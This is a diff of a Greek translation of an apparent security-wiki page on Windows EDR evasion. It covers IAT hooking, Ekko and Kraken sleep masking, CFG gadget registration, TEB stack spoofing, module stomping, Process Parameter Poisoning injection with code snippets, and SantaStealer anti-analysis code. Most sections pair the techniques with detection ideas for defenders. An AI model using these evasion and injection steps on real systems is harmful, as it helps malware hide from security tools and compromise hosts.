-- Image-load evasion: αν κάνεις hooking LoadLibrary*, παρακολούθησε ύποπτα loads από automation/clr assemblies που συσχετίζονται με memory masking events.
+- Loader telemetry: in-process writes στο IAT, early DllMain activity που τροποποιεί import thunks, μη αναμενόμενες RX regions που δημιουργούνται κατά το load.
+- Image-load evasion: αν γίνεται hooking στο LoadLibrary*, παρακολούθησε ύποπτα loads από automation/clr assemblies που συσχετίζονται με memory masking events.
 
 Related building blocks and examples
-- Reflective loaders που κάνουν IAT patching κατά το load (π.χ. TitanLdr, AceLdr)
+- Reflective loaders που εκτελούν IAT patching κατά το load (π.χ. TitanLdr, AceLdr)
 - Memory masking hooks (π.χ. simplehook) και stack-cutting PIC (stackcutting)
 - PIC call-stack spoofing stubs (π.χ. Draugr)
 
@@ -1036,96 +1036,96 @@ Related building blocks and examples
 
 ### Import-time IAT hooks via a resident PICO
 
-Αν ελέγχεις έναν reflective loader, μπορείς να κάνεις hook imports **κατά** το `ProcessImports()` αντικαθιστώντας το loader's `GetProcAddress` pointer με έναν custom resolver που ελέγχει πρώτα τα hooks:
+Αν ελέγχεις έναν reflective loader, μπορείς να κάνεις hook στα imports **κατά τη διάρκεια του** `ProcessImports()`, αντικαθιστώντας τον pointer του loader's `GetProcAddress` με έναν custom resolver που ελέγχει πρώτα τα hooks:
 
-- Φτιάξε ένα **resident PICO** (persistent PIC object) που επιβιώνει αφού το transient loader PIC απελευθερώσει τον εαυτό του.
-- Exportάρισε μια `setup_hooks()` function που overwrites τον loader's import resolver (π.χ. `funcs.GetProcAddress = _GetProcAddress`).
-- Στο `_GetProcAddress`, παράλειψε ordinal imports και χρησιμοποίησε ένα hash-based hook lookup όπως `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επέστρεψέ το· διαφορετικά κάνε delegate στο πραγματικό `GetProcAddress`.
-- Καταχώρησε hook targets στο link time με Crystal Palace `addhook "MODULE$Func" "hook"` entries. Το hook παραμένει valid επειδή ζει μέσα στο resident PICO.
+- Δημιούργησε ένα **resident PICO** (persistent PIC object) που επιβιώνει αφού το transient loader PIC κάνει free τον εαυτό του.
+- Κάνε export μια συνάρτηση `setup_hooks()` που κάνει overwrite τον import resolver του loader (π.χ. `funcs.GetProcAddress = _GetProcAddress`).
+- Στο `_GetProcAddress`, παράλειψε τα ordinal imports και χρησιμοποίησε ένα hash-based hook lookup όπως το `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επέστρεψέ το· διαφορετικά, κάνε delegate στο πραγματικό `GetProcAddress`.
+- Κατάγραψε τα hook targets κατά το link time με entries Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει valid επειδή βρίσκεται μέσα στο resident PICO.
 
-Αυτό δίνει **import-time IAT redirection** χωρίς να κάνεις patch το code section του loaded DLL post-load.
+Αυτό επιτυγχάνει **import-time IAT redirection** χωρίς patching στο code section του loaded DLL μετά το load.
 
 ### Forcing hookable imports when the target uses PEB-walking
 
-Τα import-time hooks ενεργοποιούνται μόνο αν η function βρίσκεται πράγματι στο IAT του target. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), ανάγκασε ένα πραγματικό import ώστε το `ProcessImports()` path του loader να το δει:
+Τα import-time hooks ενεργοποιούνται μόνο αν η συνάρτηση υπάρχει πράγματι στο IAT του target. Αν ένα module κάνει resolve τα APIs μέσω PEB-walk + hash (χωρίς import entry), ανάγκασε ένα πραγματικό import ώστε ο loader's `ProcessImports()` path να το δει:
 
-- Αντικατάστησε την hashed export resolution (π.χ. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με άμεση αναφορά όπως `&WaitForSingleObject`.
-- Ο compiler θα εκπέμψει ένα IAT entry, επιτρέποντας interception όταν ο reflective loader επιλύει imports.
+- Αντικατάστησε το hashed export resolution (π.χ. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με direct reference όπως το `&WaitForSingleObject`.
+- Ο compiler θα παράγει ένα IAT entry, επιτρέποντας interception όταν ο reflective loader κάνει resolve τα imports.
 
-### Ekko-style sleep/idle obfuscation χωρίς patching του `Sleep()`
+### Ekko-style sleep/idle obfuscation without patching `Sleep()`
 
-Αντί να κάνεις patch το `Sleep`, κάνε hook τα **πραγματικά wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλα waits, τύλιξε την κλήση σε μια Ekko-style obfuscation chain που κρυπτογραφεί το in-memory image κατά το idle:
+Αντί να κάνεις patch το `Sleep`, κάνε hook τα **actual wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλα waits, τύλιξε το call σε μια Ekko-style obfuscation chain που κάνει encrypt το in-memory image κατά το idle:
 
-- Χρησιμοποίησε `CreateTimerQueueTimer` για να προγραμματίσεις μια ακολουθία callbacks που καλούν `NtContinue` με crafted `CONTEXT` frames.
-- Τυπική ακολουθία (x64): θέσε το image σε `PAGE_READWRITE` → RC4 encrypt μέσω `advapi32!SystemFunction032` πάνω στο full mapped image → εκτέλεσε το blocking wait → RC4 decrypt → **restore per-section permissions** περνώντας από PE sections → σήμα ολοκλήρωσης.
-- Το `RtlCaptureContext` παρέχει ένα template `CONTEXT`· κάνε clone σε πολλαπλά frames και όρισε registers (`Rip/Rcx/Rdx/R8/R9`) για να καλέσεις κάθε βήμα.
+- Χρησιμοποίησε το `CreateTimerQueueTimer` για να προγραμματίσεις μια ακολουθία callbacks που καλούν το `NtContinue` με crafted `CONTEXT` frames.
+- Τυπική chain (x64): ρύθμισε το image σε `PAGE_READWRITE` → κάνε RC4 encrypt μέσω του `advapi32!SystemFunction032` πάνω σε ολόκληρο το mapped image → εκτέλεσε το blocking wait → κάνε RC4 decrypt → **επανάφερε τα per-section permissions** κάνοντας walk στα PE sections → κάνε signal την ολοκλήρωση.
+- Το `RtlCaptureContext` παρέχει ένα template `CONTEXT`· κλωνοποίησέ το σε πολλαπλά frames και ρύθμισε τα registers (`Rip/Rcx/Rdx/R8/R9`) ώστε να καλούν κάθε step.
 
-Operational detail: επέστρεφε “success” για μεγάλα waits (π.χ. `WAIT_OBJECT_0`) ώστε ο caller να συνεχίζει ενώ το image είναι masked. Αυτό το pattern κρύβει το module από scanners κατά τα idle windows και αποφεύγει το κλασικό “patched `Sleep()`” signature.
+Operational detail: επέστρεφε “success” για μεγάλα waits (π.χ. `WAIT_OBJECT_0`), ώστε ο caller να συνεχίζει ενώ το image είναι masked. Αυτό το pattern κρύβει το module από scanners κατά τα idle windows και αποφεύγει το κλασικό signature του patched `Sleep()`.
 
 Detection ideas (telemetry-based)
-- Burst από `CreateTimerQueueTimer` callbacks που δείχνουν σε `NtContinue`.
-- `advapi32!SystemFunction032` που χρησιμοποιείται σε μεγάλα contiguous image-sized buffers.
-- Μεγάλης κλίμακας `VirtualProtect` ακολουθούμενο από custom per-section permission restoration.
+- Bursts από `CreateTimerQueueTimer` callbacks που δείχνουν στο `NtContinue`.
+- Χρήση του `advapi32!SystemFunction032` σε μεγάλα contiguous buffers μεγέθους image.
+- Μεγάλης έκτασης `VirtualProtect` που ακολουθείται από custom per-section permission restoration.
 
 ### Runtime CFG registration for sleep-obfuscation gadgets
 
-Σε targets με CFG enabled, το πρώτο indirect jump σε mid-function gadget όπως `jmp [rbx]` ή `jmp rdi` συνήθως θα κρασάρει τη διεργασία με `STATUS_STACK_BUFFER_OVERRUN` επειδή το gadget δεν υπάρχει στο module's CFG metadata. Για να κρατήσεις ζωντανές Ekko/Kraken-style chains μέσα σε hardened processes:
+Σε CFG-enabled targets, το πρώτο indirect jump σε mid-function gadget όπως `jmp [rbx]` ή `jmp rdi` συνήθως θα κάνει crash τη process με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα CFG metadata του module. Για να διατηρήσεις ενεργές τις Ekko/Kraken-style chains μέσα σε hardened processes:
 
-- Καταχώρησε κάθε indirect destination που χρησιμοποιεί η chain με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και εγγραφές `CFG_CALL_TARGET_VALID`.
-- Για addresses μέσα σε loaded images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει το **full image size**.
-- Για manually mapped/PIC/stomped regions, χρησιμοποίησε το **allocation base** και το allocation size αντίστοιχα.
-- Σήμανε όχι μόνο το dispatch gadget, αλλά και exports που προσεγγίζονται έμμεσα (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) και οποιεσδήποτε attacker-controlled executable sections θα γίνουν indirect targets.
+- Κατάγραψε κάθε indirect destination που χρησιμοποιεί η chain με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και `CFG_CALL_TARGET_VALID` entries.
+- Για addresses μέσα σε loaded images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει ολόκληρο το image size.
+- Για manually mapped/PIC/stomped regions, χρησιμοποίησε το **allocation base** και το allocation size.
+- Κάνε mark όχι μόνο στο dispatch gadget, αλλά και στα exports που προσεγγίζονται indirectly (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και σε attacker-controlled executable sections που θα γίνουν indirect targets.
 
-Αυτό μετατρέπει ROP/JOP-style sleep chains από "δουλεύει μόνο σε non-CFG processes" σε reusable primitive για `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints compiled με `/guard:cf`.
+Αυτό μετατρέπει τις ROP/JOP-style sleep chains από primitive που “works only in non-CFG processes” σε reusable primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν γίνει compile με `/guard:cf`.
 
 ### CET-safe stack spoofing for sleeping threads
 
-Η πλήρης αντικατάσταση `CONTEXT` είναι θορυβώδης και μπορεί να σπάσει σε CET Shadow Stack systems επειδή ένα spoofed `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο sleep-masking pattern είναι:
+Η πλήρης αντικατάσταση `CONTEXT` είναι noisy και μπορεί να αποτύχει σε CET Shadow Stack systems, επειδή ένα spoofed `Rip` πρέπει να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο sleep-masking pattern είναι:
 
-- Διάλεξε άλλο thread στο ίδιο process και διάβασε τα `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) μέσω `NtQueryInformationThread`.
-- Κάνε backup το πραγματικό TEB/TIB του τρέχοντος thread.
-- Capture το πραγματικό sleeping context με `GetThreadContext`.
-- Αντέγραψε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας το spoofed `Rsp`/stack state άθικτο.
-- Κατά το sleep window, αντέγραψε το spoof thread's `NT_TIB` στο current TEB ώστε οι stack walkers να κάνουν unwind μέσα σε legitimate stack range.
-- Αφού τελειώσει το wait, επανέφερε το αρχικό TIB και thread context.
+- Επίλεξε ένα άλλο thread στην ίδια process και διάβασε τα stack bounds του `NT_TIB` / TEB (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
+- Κάνε backup το πραγματικό TEB/TIB του current thread.
+- Κάνε capture το πραγματικό sleeping context με `GetThreadContext`.
+- Αντέγραψε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας ανέπαφη την spoofed `Rsp`/stack state.
+- Κατά τη διάρκεια του sleep window, αντέγραψε το `NT_TIB` του spoof thread στο current TEB, ώστε οι stack walkers να κάνουν unwind μέσα σε legitimate stack range.
+- Μετά την ολοκλήρωση του wait, επανάφερε το αρχικό TIB και το thread context.
 
-Αυτό διατηρεί ένα CET-consistent instruction pointer ενώ παραπλανεί EDR stack walkers που εμπιστεύονται τα TEB stack metadata για να επαληθεύουν unwinds.
+Αυτό διατηρεί ένα CET-consistent instruction pointer, ενώ παραπλανά τους EDR stack walkers που εμπιστεύονται τα TEB stack metadata για την επικύρωση των unwinds.
 
 ### APC-based alternative: Kraken Mask
 
-Αν το timer-queue dispatch είναι πολύ signatured, η ίδια sleep-encrypt-spoof-restore ακολουθία μπορεί να εκτελεστεί από suspended helper thread μέσω queued APCs:
+Αν το timer-queue dispatch είναι υπερβολικά signatured, η ίδια sleep-encrypt-spoof-restore sequence μπορεί να εκτελεστεί από ένα suspended helper thread με queued APCs:
 
-- Δημιούργησε ένα helper thread με `NtTestAlert` ως entrypoint.
-- Queue prepared `CONTEXT` frames/APCs με `NtQueueApcThread` και άδειασε τα με `NtAlertResumeThread`.
-- Αποθήκευσε το chain state στο heap αντί για το helper stack ώστε να μην εξαντλήσεις το default 64 KB thread stack.
-- Χρησιμοποίησε `NtSignalAndWaitForSingleObject` για να σημαδέψεις atomically το start event και να κάνεις block.
-- Κάνε suspend το main thread πριν την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) για να μειώσεις το race window όπου ένας scanner θα μπορούσε να πιάσει ένα half-restored stack.
+- Δημιούργησε ένα helper thread με entrypoint το `NtTestAlert`.
+- Κάνε queue τα prepared `CONTEXT` frames/APCs με `NtQueueApcThread` και κάνε drain με `NtAlertResumeThread`.
+- Αποθήκευσε την chain state στο heap αντί για το helper stack, ώστε να αποφύγεις την εξάντληση του default 64 KB thread stack.
+- Χρησιμοποίησε το `NtSignalAndWaitForSingleObject` για atomic signal του start event και block.
+- Κάνε suspend το main thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να μειώσεις το race window κατά το οποίο ένας scanner θα μπορούσε να εντοπίσει ένα μισο-επαναφερμένο stack.
 
-Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με ένα helper-thread/APC signature ενώ κρατά τους ίδιους στόχους RC4 masking και stack-spoofing.
+Αυτό αντικαθιστά το signature `CreateTimerQueueTimer` + `NtContinue` με ένα helper-thread/APC signature, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.
 
 Additional detection ideas
 - `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
-- `GetThreadContext`/`SetThreadContext` γύρω από `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, ή `ConnectNamedPipe`.
-- `NtQueryInformationThread` ακολουθούμενο από άμεσες εγγραφές μέσα στα current thread's TEB/TIB stack bounds.
-- `NtQueueApcThread`/`NtAlertResumeThread` chains που φτάνουν έμμεσα σε `SystemFunction032`, `VirtualProtect`, ή helpers επαναφοράς section-permission.
+- `GetThreadContext`/`SetThreadContext` γύρω από `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
+- `NtQueryInformationThread` που ακολουθείται από direct writes στα TEB/TIB stack bounds του current thread.
+- `NtQueueApcThread`/`NtAlertResumeThread` chains που καταλήγουν indirectly στα `SystemFunction032`, `VirtualProtect` ή σε helpers για section-permission restoration.
 - Επαναλαμβανόμενη χρήση σύντομων gadget signatures όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.
 
 
 ## Precision Module Stomping
 
-Το Module stomping εκτελεί payloads από την **`.text` section ενός DLL που είναι ήδη mapped μέσα στο target process** αντί να δεσμεύει προφανή private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Το overwrite target θα πρέπει να είναι μια **loaded, disk-backed image** της οποίας ο code space μπορεί να απορροφήσει το payload χωρίς να αλλοιώσει code paths που το process χρειάζεται ακόμα.
+Το Module stomping εκτελεί payloads από το **`.text` section ενός DLL που έχει ήδη γίνει mapped μέσα στο target process**, αντί να κάνει allocate obvious private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Το overwrite target πρέπει να είναι ένα **loaded, disk-backed image**, του οποίου ο code space μπορεί να χωρέσει το payload χωρίς να καταστρέψει code paths που χρειάζεται ακόμη η process.
 
 ### Reliable target selection
 
-Το naive stomping σε κοινά modules όπως `uxtheme.dll` ή `comctl32.dll` είναι fragile: το DLL μπορεί να μην είναι loaded στο remote process και ένα πολύ μικρό code region θα κρασάρει το process. Ένα πιο αξιόπιστο workflow είναι:
+Το naive stomping σε common modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι fragile: το DLL μπορεί να μην έχει φορτωθεί στο remote process και μια υπερβολικά μικρή code region θα κάνει crash τη process. Ένα πιο reliable workflow είναι:
 
-1. Enumerate τα target process modules και κράτα μια **names-only include list** από DLLs που είναι ήδη loaded.
-2. Φτιάξε πρώτα το payload και κατέγραψε το **exact byte size**.
-3. Σάρωσε candidate DLLs στο disk και σύγκρινε το PE section **`.text` `Misc_VirtualSize`** με το payload size. Αυτό έχει μεγαλύτερη σημασία από το file size επειδή αντανακλά το μέγεθος του executable section **όταν mapped in memory**.
-4. Κάνε parse το **Export Address Table (EAT)** και διάλεξε ένα exported function RVA ως stomp start offset.
-5. Υπολόγισε το **blast radius**: αν το payload ξεπερνά το selected function boundary, θα overwrite γειτονικά exports που βρίσκονται μετά από αυτό στη μνήμη.
+1. Κάνε enumerate τα modules του target process και κράτησε μια **names-only include list** από DLLs που έχουν ήδη φορτωθεί.
+2. Κάνε build πρώτα το payload και κατέγραψε το **ακριβές byte size** του.
+3. Κάνε scan τα candidate DLLs στον δίσκο και σύγκρινε το PE section **`.text` `Misc_VirtualSize`** με το payload size. Αυτό έχει μεγαλύτερη σημασία από το file size, επειδή αντικατοπτρίζει το μέγεθος του executable section **όταν γίνεται mapped στη μνήμη**.
+4. Κάνε parse το **Export Address Table (EAT)** και επίλεξε ένα exported function RVA ως stomp start offset.
+5. Υπολόγισε το **blast radius**: αν το payload ξεπερνά το selected function boundary, θα κάνει overwrite τα adjacent exports που είναι τοποθετημένα μετά από αυτό στη μνήμη.
 
-Τυπικά recon/selection helpers που συναντώνται στο wild:
+Typical recon/selection helpers seen in the wild:
 ```cmd
 list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
 python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
@@ -1133,23 +1133,118 @@ python dump-exports.py -f <dll_path>
 python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
 ```
 Operational notes
-- Προτίμησε DLLs **already loaded** στο remote process για να αποφύγεις την τηλεμετρία του `LoadLibrary`/unexpected image loads.
-- Προτίμησε exports που εκτελούνται σπάνια από το target application, αλλιώς τα normal code paths μπορεί να περάσουν πάνω από τα stomped bytes πριν ή μετά το thread creation.
-- Τα μεγάλα implants συχνά απαιτούν αλλαγή του shellcode embedding από string literal σε **byte-array/braced initializer** ώστε ολόκληρο το buffer να αναπαριστάται σωστά στο injector source.
+- Προτίμησε DLLs που είναι **ήδη φορτωμένα** στην remote process, για να αποφύγεις το telemetry του `LoadLibrary`/των unexpected image loads.
+- Προτίμησε exports που εκτελούνται σπάνια από την target application· διαφορετικά, τα normal code paths μπορεί να εκτελέσουν τα stomped bytes πριν ή μετά τη δημιουργία του thread.
+- Τα μεγάλα implants συχνά απαιτούν αλλαγή του shellcode embedding από string literal σε **byte-array/braced initializer**, ώστε ολόκληρο το buffer να αναπαρίσταται σωστά στον injector source.
 
 Detection ideas
 - Remote writes σε **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) αντί για τις πιο συνηθισμένες private RWX/RX allocations.
-- Export entry points των οποίων τα in-memory bytes δεν ταιριάζουν πλέον με το backing file on disk.
-- Remote threads ή context pivots που ξεκινούν execution μέσα σε ένα legitimate DLL export του οποίου τα πρώτα bytes έχουν πρόσφατα τροποποιηθεί.
-- Suspicious `VirtualProtect(Ex)` / `WriteProcessMemory` sequences against DLL `.text` pages ακολουθούμενα από thread creation.
+- Export entry points των οποίων τα in-memory bytes δεν συμφωνούν πλέον με το backing file στον δίσκο.
+- Remote threads ή context pivots που ξεκινούν την εκτέλεση μέσα σε legitimate DLL export, του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
+- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε DLL `.text` pages, ακολουθούμενες από δημιουργία thread.
 
-## SantaStealer Tradecraft for Fileless Evasion and Credential Theft
+## Process Parameter Poisoning (P3)
 
-Το SantaStealer (aka BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και credential access σε ένα ενιαίο workflow.
+Το Process Parameter Poisoning (P3) είναι τεχνική **process-injection / EDR-evasion** που αποφεύγει το κλασικό remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε έναν target που εκτελείται ήδη, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης της `CreateProcessW` στη child process** και τις αποθηκεύουν μέσα στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).
+
+### Poisonable carriers copied by `CreateProcessW`
+
+Χρήσιμα carriers είναι:
+
+- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
+- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
+- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`
+
+Practical carrier constraints:
+
+- Το `lpCommandLine` πρέπει να δείχνει σε **writable memory** για την `CreateProcessW` και περιορίζεται σε **32.767 Unicode χαρακτήρες**, συμπεριλαμβανομένου του null terminator.
+- Το `lpEnvironment` πρέπει να είναι Unicode environment block από διαδοχικά strings `NAME=VALUE\0`, τα οποία τερματίζονται με ένα επιπλέον `\0`.
+- Το `lpReserved` είναι επίσημα reserved, επομένως το mapping στο `ShellInfo` πρέπει να αντιμετωπίζεται ως implementation detail και όχι ως stable documented contract.
+
+Αυτό μετατρέπει τη normal process creation σε **payload-transfer primitive**. Ο operator δημιουργεί τη child process με attacker-controlled startup data και αφήνει τα Windows να πραγματοποιήσουν το cross-process copy.
+
+### Remote lookup flow without remote write APIs
+
+Μετά τη δημιουργία της child process, κάνε resolve το copied buffer με **read-only** primitives:
+
+1. `NtQueryInformationProcess(ProcessBasicInformation)` → λάβε το `PROCESS_BASIC_INFORMATION.PebBaseAddress`
+2. Διάβασε το remote `PEB`
+3. Ακολούθησε το `PEB.ProcessParameters`
+4. Διάβασε το `RTL_USER_PROCESS_PARAMETERS`
+5. Χρησιμοποίησε τον επιλεγμένο pointer:
+- `parameters.CommandLine.Buffer`
+- `parameters.Environment`
+- `parameters.ShellInfo.Buffer`
+
+Minimal flow:
+```c
+NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
+NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
+NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
+// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
+```
+### Εκτέλεση του copied parameter buffer
+
+Η copied parameter region είναι συνήθως `RW`, όχι executable. Ένα συνηθισμένο P3 chain είναι:
+
+1. Δημιουργήστε κανονικά το process (όχι suspended)
+2. Κάντε τη σελίδα παραμέτρων που επιλέξατε executable με `NtProtectVirtualMemory` / `VirtualProtectEx`
+3. Επαναχρησιμοποιήστε το main thread handle που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
+4. Ανακατευθύνετε την εκτέλεση με `NtSetContextThread` (`CONTEXT_CONTROL`, overwrite του `RIP`)
+
+Σε αντίθεση με τα classic thread hijacking workflows, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας στο returned main thread handle.
+
+Αυτό αποφεύγει αρκετά APIs που παρακολουθούνται συνήθως για injection:
+
+- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
+- `WriteProcessMemory` / `NtWriteVirtualMemory`
+- `CreateRemoteThread` / `NtCreateThreadEx`
+- συχνά επίσης `SuspendThread` / `ResumeThread`
+
+### Περιορισμός null-byte και staged shellcode
+
+Και οι τρεις carriers είναι **string ή string-like data**, επομένως ένα raw payload που περιέχει `0x00` αποκόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **null-free first stage** που ανακατασκευάζει constants κατά το runtime και στη συνέχεια φορτώνει ένα αυθαίρετο second stage.
+
+Ένα απλό pattern είναι η XOR-based constant synthesis:
+```asm
+mov rax, XOR_A
+mov r15, XOR_B
+xor rax, r15 ; result = desired value, without embedding 0x00 bytes
+```
+Αυτό επιτρέπει στο πρώτο stage να δημιουργεί stack strings, ορίσματα API, διαδρομές DLL ή έναν second-stage shellcode loader χωρίς να ενσωματώνει null bytes στην transported παράμετρο.
+
+### Stack-based API calls από το πρώτο stage
+
+Όταν το πρώτο stage πρέπει να καλέσει APIs όπως το `LoadLibraryA`, μπορεί να:
+
+- κάνει push το string/buffer στο target stack
+- δεσμεύσει το **32-byte x64 shadow space**
+- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε constants ή pointers σχετικούς με το `RSP`
+- διατηρεί το `RSP` **16-byte aligned** πριν από το call
+
+Στη συνέχεια, ένα second stage μπορεί να αντιγραφεί από το stack σε μια `PAGE_READWRITE` allocation, να μετατραπεί σε `PAGE_EXECUTE_READ` με `VirtualProtect` και να γίνει jump σε αυτό, αποφεύγοντας μια άμεση RWX allocation.
+
+### Ιδέες για Detection
+
+Καλές ευκαιρίες για hunting που αναφέρονται από τους συγγραφείς:
+
+- `VirtualProtectEx` / `NtProtectVirtualMemory` που καθιστούν **process-parameter pages executable**
+- η συγκεκριμένη αλλαγή protection ακολουθούμενη από `SetThreadContext` / `NtSetContextThread`
+- remote reads των `PEB` και στη συνέχεια του `RTL_USER_PROCESS_PARAMETERS`
+- ασυνήθιστα μεγάλες / υψηλού entropy τιμές στα `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` κατά τη δημιουργία process
+
+### Σημειώσεις
+
+- Το P3 είναι ένα **cross-process transfer trick**, όχι από μόνο του ένα πλήρες execution primitive: η αντιγραμμένη παράμετρος εξακολουθεί να χρειάζεται αλλαγή σε execute-permission και μια μέθοδο execution redirection.
+- Οι `RtlCreateProcessReflection` / Dirty Vanity εξετάστηκαν από τους συγγραφείς, αλλά απορρίφθηκαν επειδή εσωτερικά καταλήγουν σε ύποπτα primitives όπως τα `NtWriteVirtualMemory` και `NtCreateThreadEx`.
+
+## SantaStealer Tradecraft για Fileless Evasion και Credential Theft
+
+Το SantaStealer (γνωστό και ως BluelineStealer) δείχνει πώς τα σύγχρονα info-stealers συνδυάζουν AV bypass, anti-analysis και credential access σε ένα ενιαίο workflow.
 
 ### Keyboard layout gating & sandbox delay
 
-- Ένα config flag (`anti_cis`) απαριθμεί τα εγκατεστημένα keyboard layouts μέσω του `GetKeyboardLayoutList`. Αν βρεθεί Cyrillic layout, το sample αφήνει ένα κενό `CIS` marker και τερματίζει πριν τρέξει stealers, εξασφαλίζοντας ότι δεν θα detonate ποτέ σε excluded locales ενώ αφήνει ένα hunting artifact.
+- Ένα config flag (`anti_cis`) απαριθμεί τα εγκατεστημένα keyboard layouts μέσω του `GetKeyboardLayoutList`. Αν εντοπιστεί Cyrillic layout, το sample δημιουργεί ένα κενό `CIS` marker και τερματίζεται πριν εκτελέσει stealers, διασφαλίζοντας ότι δεν θα detonates ποτέ σε excluded locales, ενώ αφήνει ένα hunting artifact.
 ```c
 HKL layouts[64];
 int count = GetKeyboardLayoutList(64, layouts);
@@ -1162,25 +1257,24 @@ ExitProcess(0);
 }
 Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
 ```
-### Λογική `check_antivm` σε επίπεδα
+### Layered λογική `check_antivm`
 
-- Η παραλλαγή A περνά από τη λίστα διεργασιών, κάνει hash κάθε ονόματος με ένα custom rolling checksum και το συγκρίνει με embedded blocklists για debuggers/sandboxes· επαναλαμβάνει το checksum για το όνομα του υπολογιστή και ελέγχει working directories όπως `C:\analysis`.
-- Η παραλλαγή B εξετάζει system properties (process-count floor, recent uptime), καλεί `OpenServiceA("VBoxGuest")` για να εντοπίσει VirtualBox additions και εκτελεί timing checks γύρω από sleeps για να εντοπίσει single-stepping. Οποιοδήποτε hit τερματίζει πριν εκκινηθούν modules.
+- Η Variant A διατρέχει τη λίστα διεργασιών, υπολογίζει το hash κάθε ονόματος με ένα custom rolling checksum και το συγκρίνει με ενσωματωμένες blocklists για debuggers/sandboxes· επαναλαμβάνει το checksum για το όνομα του υπολογιστή και ελέγχει working directories όπως `C:\analysis`.
+- Η Variant B επιθεωρεί system properties (κατώτατο όριο πλήθους διεργασιών, πρόσφατο uptime), καλεί το `OpenServiceA("VBoxGuest")` για να ανιχνεύσει VirtualBox additions και εκτελεί timing checks γύρω από sleeps για τον εντοπισμό single-stepping. Οποιοδήποτε hit διακόπτει την εκτέλεση πριν από την εκκίνηση των modules.
 
 ### Fileless helper + double ChaCha20 reflective loading
 
-- Το primary DLL/EXE ενσωματώνει ένα Chromium credential helper που είτε αποθηκεύεται στο disk είτε γίνεται manually mapped in-memory· το fileless mode επιλύει μόνο του imports/relocations, ώστε να μη γραφτούν helper artifacts.
